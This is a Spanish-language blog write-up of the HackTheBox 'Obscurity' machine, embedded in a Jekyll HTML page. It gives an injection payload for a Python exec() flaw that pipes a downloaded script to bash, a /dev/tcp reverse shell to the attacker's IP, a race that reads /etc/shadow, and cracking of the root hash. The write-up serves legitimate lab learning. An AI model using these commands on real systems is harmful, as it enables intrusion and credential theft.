@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>HTB ObscurityWrite-up (Español)</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HTB ObscurityWrite-up (Español) | 5ubterranean’s Blog</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="HTB ObscurityWrite-up (Español)" />
+<meta name="author" content="5ubterranean" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="I cloned my writeup that was originally posted on medium" />
+<meta property="og:description" content="I cloned my writeup that was originally posted on medium" />
+<link rel="canonical" href="http://localhost:8000/Obscurity-Espa%C3%B1ol" />
+<meta property="og:url" content="http://localhost:8000/Obscurity-Espa%C3%B1ol" />
+<meta property="og:site_name" content="5ubterranean’s Blog" />
+<meta property="og:image" content="http://localhost:8000/assets/images/Obscurity/1__TOuZeFGPrRiKzyAxXMXnzQ.jpeg" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-05-09T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:8000/assets/images/Obscurity/1__TOuZeFGPrRiKzyAxXMXnzQ.jpeg" />
+<meta property="twitter:title" content="HTB ObscurityWrite-up (Español)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"5ubterranean","url":"https://5ubterranean.github.io"},"dateModified":"2020-05-09T00:00:00-05:00","datePublished":"2020-05-09T00:00:00-05:00","description":"I cloned my writeup that was originally posted on medium","headline":"HTB ObscurityWrite-up (Español)","image":"http://localhost:8000/assets/images/Obscurity/1__TOuZeFGPrRiKzyAxXMXnzQ.jpeg","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/Obscurity-Espa%C3%B1ol"},"url":"http://localhost:8000/Obscurity-Espa%C3%B1ol"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>5ubterranean@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/tags.html"><h2 class="header-link">Tags</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  
+  <img src=/assets/images/Obscurity/1__TOuZeFGPrRiKzyAxXMXnzQ.jpeg/../banner.png>
+  
+  <h2>HTB ObscurityWrite-up (Español)</h2>
+  <time datetime="2020-05-09T00:00:00-05:00" class="by-line">09 May 2020</time>
+  <p>I cloned my writeup that was originally posted on <a href="https://medium.com/@5ubterranean/htb-obscuritywrite-up-espa%C3%B1ol-6d703ae8a184">medium</a></p>
+
+<p>Obscurity es una máquina basada en Linux que estuvo activa desde el 30 de Noviembre del 2019 hasta el 9 de Mayo del 2019, tal como su nombre lo indica es una maquina donde se trata de la seguridad basada en la oscuridad, en este caso tendremos que leer múltiples programas escritos en python, para acceder a la máquina conseguiremos el código fuente de su página web mediante fuzzing, detectaremos una vulnerabilidad que nos permitirá ejecutar código mientras leemos el código fuente, luego tendremos que modificar un programa de encriptación personal de la máquina para recuperar la clave que utiliza, y usaremos esa clave para desencriptar la contraseña del siguiente usuario, una vez dentro de este usuario veremos que podemos ejecutar otro archivo creado por ellos el cual copia el archivo “shadow” a una carpeta públicamente accesible por un corto periodo de tiempo, por lo que leeremos el contenido del archivo en el tiempo que tenemos, recuperaremos el hash de la contraseña del usuario “root”, la crackearemos y con ella cambiaremos nuestro usuario a “root”.</p>
+
+<h1 id="enumeración">Enumeración</h1>
+
+<p>Empezamos usando masscan para encontrar todos los puertos disponibles y luego usamos nmap para conseguir más información de los mismos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan <span class="nt">-e</span> tun0 — <span class="nv">rate</span><span class="o">=</span>500 <span class="nt">-p</span> 0–65535 10.10.10.168  
+nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 22,8080 <span class="nt">-o</span> scan.txt 10.10.10.168  
+PORT     STATE SERVICE    VERSION  
+22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>  
+8080/tcp open  http-proxy BadHTTPServer
+</code></pre></div></div>
+
+<p>Solo tenemos dos puertos abiertos, ssh y el 8080 que a pesar de lo que dice nmap, es una página web, accedemos a ella y esta nos comprueba de que la máquina se tratará de la seguridad basada en la oscuridad.</p>
+
+<p><img src="/assets/images/Obscurity/1__g2yX__58lfwhc9rEBohr__Fw.png" alt="" /></p>
+
+<p>Y en la página se nota que el administrador está bastante orgulloso de este enfoque en la seguridad, por lo que incluso nos revela el nombre del archivo de código fuente de la página, SuperSecureServer.py, y nos indica que está en un directorio “secreto”.</p>
+
+<p><img src="/assets/images/Obscurity/1__BxlPUwBybh3s1yqlhoYUjw.png" alt="" /></p>
+
+<p>Entonces utilizamos wfuzz para encontrar el archivo.<br />
+<code class="language-plaintext highlighter-rouge">wfuzz -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py -w /usr/share/wordlists/dirb/common.txt --hc 404</code></p>
+
+<p><img src="/assets/images/Obscurity/1__Q3YYMAEHutQ__AgfMWGu6Jw.png" alt="" /></p>
+
+<p>Encontramos el archivo en “http://10.10.10.168:8080/develop/SuperSecureServer.py”, por lo que lo descargamos y procedemos a analizarlo. Luego de leerlo por un rato los comentarios del desarrollador nos llaman la atención y nos indican la vulnerabilidad.</p>
+
+<p><img src="/assets/images/Obscurity/1__Gk8KPENMvV7HqF1lGl7MpQ.png" alt="" /></p>
+
+<p>La vulnerabilidad se encuentra en que la ruta a la que accedamos será enviada a una función “exec”, es decir si insertamos código de python este será ejecutado.</p>
+
+<h1 id="ganando-acceso">Ganando acceso</h1>
+
+<p>Creamos un archivo llamado “shell.sh” que contendrá nuestro código para una shell reversa, este código es: <code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/10.10.15.64/5555 0&gt;&amp;1  
+</code>Luego iniciamos un servidor http del cual la máquina atacada descargará el archivo, para esto usamos <code class="language-plaintext highlighter-rouge">python3 -m http.server</code>. Antes de ejecutar el ataque iniciamos nuestro listener con <code class="language-plaintext highlighter-rouge">nc -lvp 5555</code>, para que la máquina atacada descargue nuestra payload y la ejecute accederemos a la ruta <code class="language-plaintext highlighter-rouge">’;os.system(‘curl 10.10.15.64:8000/shell.sh | bash’);’</code>, ya que el script ya importa el módulo “os” podemos usarlo para ejecutar comandos directamente, así que podemos usar curl y enviar su salida a bash, para evitar que alguno de los carácteres especiales rompa la petición lo codificamos en URL: <code class="language-plaintext highlighter-rouge">%27%3b%6f%73%2e%73%79%73%74%65%6d%28%27%63%75%72%6c%20%31%30%2e%31%30%2e%31%35%2e%36%34%3a%38%30%30%30%2f%73%68%65%6c%6c%2e%73%68%20%7c%20%62%61%73%68%27%29%3b%27</code>.</p>
+
+<p><img src="/assets/images/Obscurity/1__wjQ__kmxTqxCP8mHk15yudQ.png" alt="" /></p>
+
+<p>Y tras enviar la petición conseguimos nuestra shell inicial.</p>
+
+<p><img src="/assets/images/Obscurity/1____EUx2RquDekwAjWGgYoytg.png" alt="" /></p>
+
+<h1 id="movimiento-lateral">Movimiento lateral</h1>
+
+<p>Exploramos la máquina y vemos que cualquiera puede acceder al directorio de robert, y ahí encontramos algunos archivos interesantes.</p>
+
+<p><img src="/assets/images/Obscurity/1__HDejo4zgOM3gBSJ2IpUh3A.png" alt="" /></p>
+
+<p>Leemos el contenido de “check.txt”:<br />
+<code class="language-plaintext highlighter-rouge">Encrypting this file with your key should result in out.txt, make sure your key is correct!</code>.<br />
+Este nos indica que si encriptamos ese archivo usando la clave indicada el resultado será “out.txt”, no tenemos la clave, pero tenemos el archivo de entrada, el de salida y el código de encriptación y desencriptación, por lo que podemos modificarlo para recuperar la clave.<br />
+Empezamos revisando el código de encriptación dentro de “SuperSecureCrypt.py”</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+
+    <span class="n">keylen</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+
+    <span class="n">keyPos</span> <span class="o">=</span> <span class="mi">0</span>
+
+    <span class="n">encrypted</span> <span class="o">=</span> <span class="sh">""</span>
+
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
+
+        <span class="n">keyChr</span> <span class="o">=</span> <span class="n">key</span>\<span class="p">[</span><span class="n">keyPos</span>\<span class="p">]</span>
+
+        <span class="n">newChr</span> <span class="o">=</span> <span class="nf">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+
+        <span class="n">newChr</span> <span class="o">=</span> <span class="nf">chr</span><span class="p">((</span><span class="n">newChr</span> <span class="o">+</span> <span class="nf">ord</span><span class="p">(</span><span class="n">keyChr</span><span class="p">))</span> <span class="o">%</span> <span class="mi">255</span><span class="p">)</span>
+
+        <span class="n">encrypted</span> <span class="o">+=</span> <span class="n">newChr</span>
+
+        <span class="n">keyPos</span> <span class="o">+=</span> <span class="mi">1</span>
+
+        <span class="n">keyPos</span> <span class="o">=</span> <span class="n">keyPos</span> <span class="o">%</span> <span class="n">keylen</span>
+
+    <span class="k">return</span> <span class="n">encrypted</span>
+</code></pre></div></div>
+
+<p>Lo que hace el script es sacar el <code class="language-plaintext highlighter-rouge">ord</code> del primer carácter de la clave y del texto, sumarlos, sacarles el módulo de 255 para asegurarse que no supere este valor y obtener el <code class="language-plaintext highlighter-rouge">chr</code> de esta operación, repite esto para cada carácter del texto de entrada y para la llave, volviendo a usarla desde el comienzo si se supera su longitud.<br />
+Recuperar la clave es bastante sencillo, tomaremos los dos archivos que tenemos “check.txt” y “out.txt” sacaremos el <code class="language-plaintext highlighter-rouge">ord</code> de cada uno de sus valores y calcularemos la resta de “out.txt” menos “check.txt”, en caso este valor sea inferior a 0 sumaremos 255, calcularemos el <code class="language-plaintext highlighter-rouge">chr</code> de este nuevo valor y conseguimos la clave repetida múltiples veces, en el código mostrado a continuación se limitó la salida a 13 caracteres ya que luego de su primera ejecución ya conocíamos la longitud de la clave.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">check.txt</span><span class="sh">"</span><span class="p">,</span><span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">q</span><span class="p">:</span>
+
+    <span class="nb">input</span> <span class="o">=</span> <span class="n">q</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
+
+<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">out.txt</span><span class="sh">"</span><span class="p">,</span><span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">q</span><span class="p">:</span>
+
+    <span class="n">output</span> <span class="o">=</span> <span class="n">q</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
+
+<span class="n">key</span> <span class="o">=</span> <span class="sh">""</span>
+
+<span class="n">x</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="k">while</span> <span class="n">x</span> <span class="o">&lt;</span> <span class="mi">13</span><span class="p">:</span>
+
+    <span class="n">z</span> <span class="o">=</span> <span class="nf">ord</span><span class="p">(</span><span class="n">output</span>\<span class="p">[</span><span class="n">x</span>\<span class="p">])</span> <span class="o">-</span> <span class="nf">ord</span><span class="p">(</span><span class="nb">input</span>\<span class="p">[</span><span class="n">x</span>\<span class="p">])</span>
+
+    <span class="k">if</span> <span class="n">z</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+
+        <span class="n">z</span> <span class="o">+=</span> <span class="mi">255</span>
+
+    <span class="n">key</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">z</span><span class="p">)</span>
+
+    <span class="n">x</span> <span class="o">+=</span> <span class="mi">1</span>
+
+<span class="nf">print </span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>En este caso llamamos a este archivo “rev.py” y tras ejecutarlo conseguimos la clave “alexandrovich”.</p>
+
+<p><img src="/assets/images/Obscurity/1__AZytQhiVHHVztcq59gQxiA.png" alt="" /></p>
+
+<p>Ahora que recuperamos la clave podemos desencriptar el otro archivo que nos llamó la atención “passwordreminder.txt”, aquí no tenemos que realizar ningún cambio al script, solo tenemos que ejecutar <code class="language-plaintext highlighter-rouge">python3 SuperSecureCrypt.py -i passwordreminder.txt -k alexandrovich -d -o password.txt</code>, y tendremos que la contraseña de “robert” es “SecThruObsFTW”.</p>
+
+<p><img src="/assets/images/Obscurity/1__2EQi4BPQriL9CrUzWnlldQ.png" alt="" /></p>
+
+<p>Y con esto nos podemos conectar a través de ssh y conseguimos el “user.txt”.</p>
+
+<p><img src="/assets/images/Obscurity/1__fNBBrC7l3xM9u7dAHNRfDw.png" alt="" /></p>
+
+<h1 id="escalación-de-privilegios">Escalación de privilegios</h1>
+
+<p>Ejecutamos <code class="language-plaintext highlighter-rouge">sudo -l</code> para ver si podemos ejecutar algún comando con privilegios de root y vemos que podemos ejecutar otro script propio, BetterSSH.py.</p>
+
+<p><img src="/assets/images/Obscurity/1__a4nmeGpTw2cuPo2DtDZeIw.png" alt="" /></p>
+
+<p>Tenemos permisos de lectura sobre este archivo, así que una vez más tendremos que analizar el código.<br />
+Lo que hace este script es spawnear un estilo de shell con los privilegios del usuario del cual proveas las credenciales, para verificar esto el script recurre al archivo “shadow” y si el hash de la contraseña ingresada es el mismo que el que se encuentra allí se accede a esta shell, lo que más nos interesa del archivo se encuntra entre las líneas 15 y 26:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">/etc/shadow</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">readlines</span><span class="p">()</span>
+
+<span class="n">data</span> <span class="o">=</span> \<span class="p">[(</span><span class="n">p</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">)</span> <span class="k">if</span> <span class="sh">"</span><span class="s">$</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">p</span> <span class="k">else</span> <span class="bp">None</span><span class="p">)</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">data</span>\<span class="p">]</span>
+
+<span class="n">passwords</span> <span class="o">=</span> \<span class="p">[</span>\<span class="p">]</span>
+
+<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+
+        <span class="n">passwords</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+
+<span class="n">passwordFile</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\\</span><span class="s">n</span><span class="sh">'</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span>\<span class="p">[</span><span class="sh">'</span><span class="se">\\</span><span class="s">n</span><span class="sh">'</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">passwords</span>\<span class="p">])</span>
+
+<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">/tmp/SSH/</span><span class="sh">'</span><span class="o">+</span><span class="n">path</span><span class="p">,</span> <span class="sh">'</span><span class="s">w</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+
+    <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">passwordFile</span><span class="p">)</span>
+
+<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(.</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Lo que hace esta parte del código es copiar el archivo shadow a un archivo con nombre aleatorio dentro de “/tmp/SSH”, y esperar 0.1 segundos, luego el código no mostrado procederá con la evaluación de la credenciales y borrará este archivo. Para poder abusar de esta funcionalidad necesitaremos una segunda shell, ya que podemos acceder por ssh no tenemos problema con ello, luego vamos al directorio “/tmp/SSH” y ejecutamos la siguiente línea de comandos: <code class="language-plaintext highlighter-rouge">while true;do cat * 2&gt;/dev/null; done</code>, lo que hace esta línea de comandos es imprimir el contenido de cualquier archivo dentro de este directorio, ya que este está vacio no nos inundará la pantalla y solo nos mostrará el contenido del archivo shadow, luego en nuestra primera shell ejecutamos <code class="language-plaintext highlighter-rouge">sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</code>, aunque no es necesario ingresamos las credenciales de robert.</p>
+
+<p><img src="/assets/images/Obscurity/1__PJ3Mg0kCUMvP1c1SiCaPsQ.png" alt="" /></p>
+
+<p>Y si revisamos nuestra otra shell veremos el contenido del archivo shadow en ella.</p>
+
+<p><img src="/assets/images/Obscurity/1__RP3Kh1mseS2H3uIBb30erA.png" alt="" /></p>
+
+<p>Ahora tenemos el hash de la contraseña del usuario root, “$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1”, la copiamos a nuestra máquina y dejamos que john haga su trabajo, <code class="language-plaintext highlighter-rouge">john hash --wordlist=/usr/share/wordlists/rockyou.txt</code>, una vez termine obtendremos que su contraseña es “mercedes”.</p>
+
+<p><img src="/assets/images/Obscurity/1__Rc__jUgzFXxpRy6apSpF3bA.png" alt="" /></p>
+
+<p>Todo lo que queda es ejecutar <code class="language-plaintext highlighter-rouge">su root</code>, ingresar la contraseña y habremos acabado con la máquina.</p>
+
+<p><img src="/assets/images/Obscurity/1____6__8EkNQsZkB8PKx9r6mOQ.png" alt="" /></p>
+
+<h1 id="descargo-de-responsabilidad">Descargo de responsabilidad</h1>
+
+<p>Todos los recursos brindados en este post se hicieron puramente con fines educativos y de concientización, el autor no se hace responsable por las acciones que las personas puedan realizar con el contenido del mismo.</p>
+
+  <div class="tags">
+  <h3>Tags</h3>
+  
+  <a href="/tags.html#hackthebox"> HackTheBox</a> &nbsp;
+  
+  <a href="/tags.html#python"> python</a> &nbsp;
+  
+  <br />
+  <br />
+  </div>
+  <script src="https://www.hackthebox.eu/badge/68440"></script>
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>5ubterranean</b>
+    </span>
+    
+    <span>© 2025</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
